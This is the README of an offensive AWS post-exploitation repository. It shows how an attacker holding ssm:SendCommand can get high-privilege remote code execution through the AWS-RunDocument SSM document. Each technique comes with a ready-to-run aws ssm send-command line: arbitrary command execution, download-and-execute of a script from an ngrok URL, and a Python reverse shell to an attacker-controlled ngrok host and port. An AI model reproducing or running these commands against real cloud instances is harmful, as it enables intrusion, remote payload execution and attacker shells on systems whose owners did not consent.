# fun-with-ssm

Getting RCE with SSM documents other than AWS-RunShellScript or AWS-RunPowerShellScript. Useful in an AWS post-exploitation scenario where you have the permission ssm:SendCommand, but you can't use the mentioned documents. Don't forget, everything is executed under high privielges.

# Usage

Repository structure:
- `/`: Folders with the name of the documents
- `/${document-name}`: Contains OS subfolders (windows, linux or cross-platform)
- `/${document-name}/${os-subfolder}`: Contains the payloads available

All the payloads are parametereized. Below you can find examples on how to use them.

##  AWS-RunDocument

### cross-platform/Execute-Commands

Type: Arbitrary command execution

Target OS: Linux and Windows

Parameters:
- `commands`: Array of strings with commands to execute on the remote system
  - Mandatory: yes
- `workingDirectory`: Directory where command to be executed
  - Mandatory: no
  - Default value: .
  
Usage:

```bash
aws ssm send-command --document-name "AWS-RunDocument" \
  --instance-id i-06ae9883fe6e5d721 \
  --parameters '{"sourceType":["GitHub"],"sourceInfo":["{\"owner\":\"saw-your-packet\", \"repository\":\"aws-tests\", \"path\":\"Execute-Command\",\"getOptions\":\"branch:main\"}"],"documentParameters":["{\"commands\":[\"ls\",\"whoami\"],\"workingDirectory\":\"/tmp\"}"]}'
```

### cross-platform/Download-and-Execute

Type: Executes file from remote server

Target OS: Linux and Windows

Parameters:
- `url`: Full download URL of the file. Needs to include the file's name.
  - Mandatory: yes
- `name`: File's name
  - Mandatory: yes
- `destination`: Location where the file to be saved
  - Mandatory: yes
  
Usage:

```bash
aws ssm send-command --document-name "AWS-RunDocument" \
  --instance-id i-0972f048bf66a424b \
  --parameters '{"sourceType":["GitHub"],"sourceInfo":["{\"owner\":\"saw-your-packet\", \"repository\":\"fun-with-ssm\", \"path\":\"AWS-RunDocument/cross-platform/Download-and-Execute\",\"getOptions\":\"branch:main\"}"],"documentParameters":["{\"url\":\"https://b402-188-27-132-214.eu.ngrok.io/script.ps1\",\"name\":\"script.ps1\", \"destination\":\"C:/\"}"]}'
```

###  linux/Reverse-Shell-Python

Type: Parameterized reverse shell using python

Target OS: Linux

Parameters:
- `host`: Attacker's host 
  - Mandatory: yes 
- `port`: Attacker's port
  - Mandatory: no
  - Default value: 4444

Usage:

```bash
aws ssm send-command --document-name "AWS-RunDocument" \
  --instance-id i-06ae9883fe6e5d721 \
  --parameters '{"sourceType":["GitHub"],"sourceInfo":["{\"owner\":\"saw-your-packet\", \"repository\":\"fun-with-ssm\", \"path\":\"AWS-RunDocument/linux/Reverse-Shell-Python\",\"getOptions\":\"branch:main\"}"], "documentParameters":["{\"host\":\"2.tcp.eu.ngrok.io\",\"port\":\"11448\"}"]}'
```
